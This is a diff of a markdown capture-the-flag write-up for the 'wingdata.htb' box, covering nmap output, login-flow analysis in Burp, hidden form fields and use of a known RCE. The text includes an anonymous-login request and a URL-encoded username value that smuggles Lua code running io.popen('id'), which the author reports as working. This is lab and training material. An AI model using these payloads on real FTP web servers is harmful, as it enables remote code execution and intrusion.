@@ -21,6 +21,7 @@ Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 38.09 seconds
 ```
+\
 - first of all theres an ssh port , and a web port, we dont have credentials for the ssh, so let's check the web page.
 - Theres nothing really ineteresting in the page except for the "client portal" which leads to a login page "ftp.wingdata.htb/login.html"
 ```
@@ -31,22 +32,22 @@ ftp
 ```
 -so we found that ftp is the only subdomain.
 
-- time for some burpsuite and testing (to get an idea of how their login works)
+- time for some burpsuite and testing (to get an idea of how their login works)\
 ![alt text](image.png)
 so this is how the login flow works, there's something quite interesting, username_val and password_val, im not quite sure whats the point from it but let's keep it in mind just in case.
 
-- I was stuck for like 20 minutes and i was reading the html and js code from the browser and i found something really interesting :
-  ![alt text](image-1.png)
+- I was stuck for like 20 minutes and i was reading the html and js code from the browser and i found something really interesting :\
+  ![alt text](image-1.png)\
   hidden input fields ;0
   lets make them shown and test them\
-  there they are !
-  ![alt text](image-2.png)
+  there they are !\
+  ![alt text](image-2.png)\
   lets test the request now
   well its the hidden ones that resemble the username_val and password_val , and guess what , they're the ones actually tested. 
 
 
-  - let's ignore that i was stuck there for another 20 minutes, I tried to think out of the box, and look what i found !
-  ![alt text](image-3.png)
+  - let's ignore that i was stuck there for another 20 minutes, I tried to think out of the box, and look what i found !\
+  ![alt text](image-3.png)\
   this exact version had a recent RCE vulnerability, let's try to use it
 
   well from what i read , i understand that to use the exploit u have to have Anonymous login enabled, and its quite easy, use this payload : ``` username=anonymous&password=&remember=true``` \
@@ -56,8 +57,8 @@ so this is how the login flow works, there's something quite interesting, userna
     ``` username=anonymous%00]]%0dlocal%20h%20%3d%20io.popen(%22id%22)%0dlocal%20r%20%3d%20h%3aread(%22*a%22)%0dh%3aclose()%0dprint(r)%0d--&password=&remember=true ```
     (url encoded)
 
-    its working !
-    ![alt text](image-4.png)
+    its working !\
+    ![alt text](image-4.png)\
     now (from what i read from this cve documentation, we shall check /dir.html for possible code execution (while using the same cookie -UID))
     ![alt text](image-5.png)
 
